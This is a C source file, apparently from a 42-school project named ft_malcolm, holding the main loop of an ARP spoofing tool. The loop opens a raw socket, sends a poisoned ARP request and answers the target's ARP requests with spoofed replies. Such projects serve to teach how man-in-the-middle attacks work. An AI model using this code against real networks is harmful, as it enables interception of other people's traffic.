/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lucocozz <lucocozz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/03/28 19:43:13 by lucocozz          #+#    #+#             */
/*   Updated: 2023/04/23 17:42:53 by lucocozz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

bool g_running = true;

int	main(int argc, char **argv)
{
	int					sock;
	struct ether_arp	packet = {0};
	t_cli				cli = get_cli(argc, argv);

	
	set_signals();
	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock == -1) {
		dprintf(STDERR_FILENO, "socket(): %s\n", strerror(errno));
		return (EXIT_ERROR);
	}
	
	send_arp(sock, cli, poisoned_arp_request);
	while (g_running == true) {
		recv_arp_from_ip(sock, &packet, cli.target_ip);
		if (packet.arp.opcode == ARPOP_REQUEST)
			send_arp(sock, cli, arp_reply);
	}

	close(sock);
	return (EXIT_SUCCESS);
}
